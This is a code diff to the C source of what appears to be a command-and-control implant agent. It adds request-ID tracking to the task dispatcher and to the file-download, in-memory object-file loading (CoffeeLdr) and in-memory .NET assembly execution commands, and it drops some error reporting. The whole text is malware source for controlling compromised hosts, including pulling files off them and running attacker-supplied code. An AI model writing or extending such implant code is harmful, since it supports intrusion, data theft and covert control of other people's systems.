@@ -51,6 +51,7 @@ VOID CommandDispatcher( VOID )
     LPVOID   TaskBuffer     = NULL;
     UINT32   TaskBufferSize = 0;
     UINT32   CommandID      = 0;
+    UINT32   RequestID      = 0;
 
     PRINTF( "Session ID => %x\n", Instance.Session.AgentID );
 
@@ -102,12 +103,15 @@ VOID CommandDispatcher( VOID )
             ParserNew( &Parser, DataBuffer, DataBufferSize );
             do
             {
+                RequestID  = ParserGetInt32( &Parser );
                 CommandID  = ParserGetInt32( &Parser );
                 TaskBuffer = ParserGetBytes( &Parser, &TaskBufferSize );
 
+                Instance.CurrentRequestID = RequestID;
+
                 if ( CommandID != DEMON_COMMAND_NO_JOB )
                 {
-                    PRINTF( "Task => CommandID:[%d : %x] TaskBuffer:[%x : %d]\n", CommandID, CommandID, TaskBuffer, TaskBufferSize )
+                    PRINTF( "Task => RequestID:[%d : %x] CommandID:[%d : %x] TaskBuffer:[%x : %d]\n", RequestID, RequestID, CommandID, CommandID, TaskBuffer, TaskBufferSize )
                     if ( TaskBufferSize != 0 )
                     {
                         ParserNew( &TaskParser, TaskBuffer, TaskBufferSize );
@@ -795,6 +799,8 @@ VOID CommandFS( PPARSER Parser )
             else
                 Download = DownloadAdd( hFile, FileSize );
 
+            Download->RequestID = Instance.CurrentRequestID;
+
             /*
 			 * Download Header:
 			 *  [ Mode      ] Open ( 0 ), Write ( 1 ) or Close ( 2 )
@@ -1065,7 +1071,6 @@ VOID CommandInlineExecute( PPARSER Parser )
     DWORD FunctionNameSize = 0;
     DWORD ObjectDataSize   = 0;
     DWORD ArgSize          = 0;
-    DWORD Status           = 0;
     PCHAR FunctionName     = ParserGetBytes( Parser, &FunctionNameSize );
     PCHAR ObjectData       = ParserGetBytes( Parser, &ObjectDataSize );
     PCHAR ArgBuffer        = ParserGetBytes( Parser, &ArgSize );
@@ -1081,11 +1086,7 @@ VOID CommandInlineExecute( PPARSER Parser )
         case 0:
         {
             PUTS( "Use Non-Threaded CoffeeLdr" )
-            Status = CoffeeLdr( FunctionName, ObjectData, ArgBuffer, ArgSize );
-            if ( Status )
-            {
-                PackageTransmitError( CALLBACK_ERROR_COFFEXEC, Status );
-            }
+            CoffeeLdr( FunctionName, ObjectData, ArgBuffer, ArgSize );
             break;
         }
 
@@ -1108,11 +1109,7 @@ VOID CommandInlineExecute( PPARSER Parser )
             else
             {
                 PUTS( "Config is set to non-threaded" )
-                Status = CoffeeLdr( FunctionName, ObjectData, ArgBuffer, ArgSize );
-                if ( Status )
-                {
-                    PackageTransmitError( CALLBACK_ERROR_COFFEXEC, Status );
-                }
+                CoffeeLdr( FunctionName, ObjectData, ArgBuffer, ArgSize );
             }
 
             break;
@@ -1610,8 +1607,9 @@ VOID CommandAssemblyInlineExecute( PPARSER Parser )
         BUFFER AssemblyData = { 0 };
         BUFFER AssemblyArgs = { 0 };
 
-        Instance.Dotnet          = NtHeapAlloc( sizeof( DOTNET_ARGS ) );
-        Instance.Dotnet->Invoked = FALSE;
+        Instance.Dotnet            = NtHeapAlloc( sizeof( DOTNET_ARGS ) );
+        Instance.Dotnet->RequestID = Instance.CurrentRequestID;
+        Instance.Dotnet->Invoked   = FALSE;
 
         /* Parse Pipe Name */
         Buffer.Buffer = ParserGetBytes( Parser, &Buffer.Length );
